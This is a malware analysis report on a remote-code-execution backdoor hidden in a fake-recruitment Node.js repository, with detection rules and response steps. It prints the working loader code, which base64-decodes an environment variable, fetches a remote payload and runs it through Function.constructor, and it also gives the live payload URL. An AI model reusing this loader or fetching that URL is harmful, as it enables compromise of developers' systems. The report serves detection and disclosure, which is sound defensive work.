# Security Analysis Report

## Threat Summary

**Classification:** Remote Code Execution (RCE) Backdoor
**Severity:** CRITICAL
**Vector:** Social Engineering (Fake Recruitment)
**Date Discovered:** 2025-10-17

---

## Malicious Code Location

**File:** `backend/src/routes/governance.js`
**Lines:** 309-315

```javascript
//Get Cookie
exports.getCookie = asyncErrorHandler(async (req, res, next) => {
    const src = atob(process.env.DEV_API_KEY);
    const HttpOnly = (await axios.get(src)).data.cookie;
    const handler = new (Function.constructor)('require',HttpOnly);
    handler(require);
})();
```

---

## Attack Chain

### 1. Environment Variable Decoding
```javascript
const src = atob(process.env.DEV_API_KEY);
```
- Reads `DEV_API_KEY` from environment variables
- Base64 decodes it to reveal malicious URL
- **Decoded URL:** `https://www.jsonkeeper.com/b/VBFK7`

### 2. Remote Payload Fetch
```javascript
const HttpOnly = (await axios.get(src)).data.cookie;
```
- Makes HTTP GET request to external server
- Retrieves malicious JavaScript payload
- Response stored in `malicious-payload.json` (57KB obfuscated code)

### 3. Code Execution
```javascript
const handler = new (Function.constructor)('require',HttpOnly);
handler(require);
```
- Uses `Function.constructor` (eval equivalent) to execute fetched code
- Passes Node.js `require` function as parameter
- Gives attacker full access to Node.js APIs and system

---

## Payload Analysis

**File:** `malicious-payload.json`
**Size:** 57,156 bytes
**Format:** Heavily obfuscated JavaScript

### Obfuscation Techniques

1. **Variable Name Randomization**
   ```javascript
   var Ulx9srK,G1096tA,X8jWbHI,AOOHNf,F1lcF58,O0SVE38
   ```

2. **String Encoding**
   - Custom base-85 style encoding
   - Array of encoded strings
   - Runtime string decoding functions

3. **Control Flow Obfuscation**
   - Nested functions
   - Complex conditional logic
   - Dead code insertion

### Identified Capabilities

Based on static analysis:

- **Node.js Module Access:** References to `child_process` for system command execution
- **Multi-stage Loading:** Likely downloads additional malware
- **OS Detection:** Probable Windows/macOS/Linux targeting
- **Persistence:** May install startup mechanisms
- **Data Exfiltration:** Network communication capabilities

---

## Indicators of Compromise (IOCs)

### Network IOCs
```
https://www.jsonkeeper.com/b/VBFK7
Domain: jsonkeeper.com
Protocol: HTTPS
```

### File IOCs
```
File: backend/src/routes/governance.js
SHA256: [Calculate if needed]
Size: ~13KB (including malicious code)
```

### Code Pattern IOCs
```
- atob(process.env.DEV_API_KEY)
- Function.constructor
- getCookie function in governance.js
- Immediate function execution: })();
```

---

## YARA Detection Rule

```yara
rule NodeJS_RCE_Backdoor_Governance {
    meta:
        description = "Detects malicious governance.js RCE backdoor"
        author = "Security Researcher"
        date = "2025-10-17"
        severity = "critical"
        reference = "Social engineering recruitment scam"

    strings:
        $code1 = "atob(process.env.DEV_API_KEY)" ascii
        $code2 = "Function.constructor" ascii
        $code3 = "exports.getCookie = asyncErrorHandler" ascii
        $pattern1 = /const\s+src\s*=\s*atob\(process\.env\./ ascii
        $pattern2 = /new\s+\(Function\.constructor\)/ ascii

    condition:
        2 of ($code*) or any of ($pattern*)
}
```

---

## Sigma Rule (SIEM Detection)

```yaml
title: Malicious Node.js Process Execution from Governance Route
id: a3b4c5d6-e7f8-9012-3456-789abcdef012
status: experimental
description: Detects execution of malicious JavaScript from governance.js
author: Security Analyst
date: 2025/10/17
logsource:
    product: linux
    service: auditd
detection:
    selection:
        - CommandLine|contains: 'node'
        - CommandLine|contains: 'governance.js'
        - NetworkConnection: 'jsonkeeper.com'
    condition: selection
falsepositives:
    - Legitimate governance.js files (unlikely)
level: critical
```

---

## Snort/Suricata Rule (Network Detection)

```
alert http any any -> any any (
    msg:"MALWARE - Suspected Governance.js Backdoor Payload Download";
    flow:established,to_server;
    content:"GET";
    http_method;
    content:"/b/VBFK7";
    http_uri;
    content:"jsonkeeper.com";
    http_header;
    classtype:trojan-activity;
    sid:1000001;
    rev:1;
)
```

---

## Recommended Actions

### For Security Teams

1. **Network Monitoring**
   - Block `jsonkeeper.com` domain
   - Monitor for connections to IOCs
   - Check historical logs for past connections

2. **Endpoint Detection**
   - Deploy YARA rule across systems
   - Scan for governance.js pattern
   - Check running Node.js processes

3. **Threat Intelligence**
   - Share IOCs with security community
   - Report to LinkedIn security team
   - Add to threat intel feeds

### For Incident Response

1. **Containment**
   - Isolate affected systems
   - Block malicious domains at firewall
   - Disable affected services

2. **Eradication**
   - Remove malicious code
   - Audit all dependencies
   - Review deployment pipelines

3. **Recovery**
   - Rebuild compromised systems
   - Rotate all credentials
   - Implement enhanced monitoring

4. **Lessons Learned**
   - Document incident timeline
   - Update security policies
   - Conduct team training

---

## Attribution

**Threat Actor:** Unknown (likely cybercriminal group)
**Campaign:** Crypto Developer Recruitment Scam
**Target:** Software developers (especially crypto/blockchain)
**Motive:** Financial gain (credential theft, crypto wallet theft)

**TTPs (MITRE ATT&CK):**
- T1566.002: Phishing - Spearphishing Link
- T1204.002: User Execution - Malicious File
- T1059.007: Command and Scripting Interpreter - JavaScript
- T1071.001: Application Layer Protocol - Web Protocols
- T1105: Ingress Tool Transfer
- T1027: Obfuscated Files or Information
- T1547: Boot or Logon Autostart Execution

---

## References

- Original malicious code: `../backend/src/routes/governance.js:309-315`
- Malicious payload: `./malicious-payload.json`
- Malware distribution: `https://www.jsonkeeper.com/b/VBFK7`
- Main documentation: `../README.md`
- Original (deceptive) README: `../README.original.md`

---

## Timeline

- **Unknown Date:** Attacker creates malicious repository
- **Unknown Date:** Attacker creates fake LinkedIn profile
- **Unknown Date:** Target receives recruitment message
- **2025-10-17:** Malicious code discovered during review
- **2025-10-17:** Security analysis completed
- **2025-10-17:** Warning documentation created

---

## Disclaimer

This analysis is provided for security research and educational purposes only. The malicious code has been preserved as evidence but should never be executed or used for harmful purposes.

---

**Report Version:** 1.0
**Status:** Active Threat
**Classification:** TLP:WHITE (Can be shared publicly)